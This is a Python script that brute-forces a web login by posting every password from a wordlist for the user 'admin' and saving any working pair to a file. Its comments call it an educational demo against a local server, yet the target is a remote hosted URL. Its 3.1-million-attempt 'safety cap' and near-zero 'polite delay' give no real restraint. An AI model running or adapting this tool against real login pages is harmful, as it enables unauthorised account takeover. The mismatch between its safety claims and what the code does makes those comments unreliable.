# password_file_bruteforce.py
# Educational/demo only — test ONLY against the local demo_target.py server.
# Reads passwords from a file and brute forces against usernames.

import time
import requests

# --- Configuration ---
TARGET_URL = "https://twosaunsecured.onrender.com/login"  # local demo_target
USERNAMES = ["admin"]
MAX_TRIALS = 3100000       # safety cap on total attempts
DELAY_SECONDS = 0.00001      # polite delay between attempts
OUTPUT_FILE = "found_credentials.txt"
PASSWORD_FILE ="Brute Force Project/password.txt"  # File containing passwords (one per line)
# --------------------

def load_passwords_from_file(filename: str) -> list:
    """Load passwords from a file, one per line."""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"Loaded {len(passwords)} passwords from {filename}")
        return passwords
    except FileNotFoundError:
        print(f"Error: Password file '{filename}' not found.")
        return []
    except Exception as e:
        print(f"Error reading password file: {e}")
        return []

def try_login(username: str, password: str) -> bool:
    """Send a POST to local target. Returns True if login OK (JSON {'ok': True}) or 200 with welcome."""
    try:
        resp = requests.post(TARGET_URL, data={'username': username, 'password': password}, timeout=5)
        # If target returns JSON with {"ok": True}, treat as success
        try:
            j = resp.json()
            if isinstance(j, dict) and j.get('ok') is True:
                return True
        except ValueError:
            # Not JSON — fall back to content checks
            pass
        # Also accept a 200 + "Welcome" in text or a redirect (non-equal url) as success
        if resp.status_code == 200 and "Welcome" in resp.text:
            return True
        return False
    except requests.RequestException as e:
        print("Request error:", e)
        return False

def save_found_credentials(username: str, password: str, filename: str = OUTPUT_FILE):
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(f"{username}:{password}\n")

def main():
    print(f"Loading passwords from {PASSWORD_FILE}...")
    passwords = load_passwords_from_file(PASSWORD_FILE)
    
    if not passwords:
        print("No passwords loaded. Exiting.")
        return
    
    print(f"Starting brute force with {len(passwords)} passwords...")
    attempts = 0
    
    for password in passwords:
        print(f"\n[*] Testing password: {password}")
        for username in USERNAMES:
            if attempts >= MAX_TRIALS:
                print("[!] Safety cap reached. Stopping further attempts.")
                return
            attempts += 1
            print(f"Trying ({attempts}) {username} / {password}")
            success = try_login(username, password)
            if success:
                msg = f"Login successful! username={username} password={password}"
                print("\n" + "="*40)
                print(msg)
                print("="*40 + "\n")
                save_found_credentials(username, password)
                return  # STOP IMMEDIATELY on success
            time.sleep(DELAY_SECONDS)  # polite delay between requests

    print("Finished attempts. No valid credentials found.")

if __name__ == "__main__":
    main()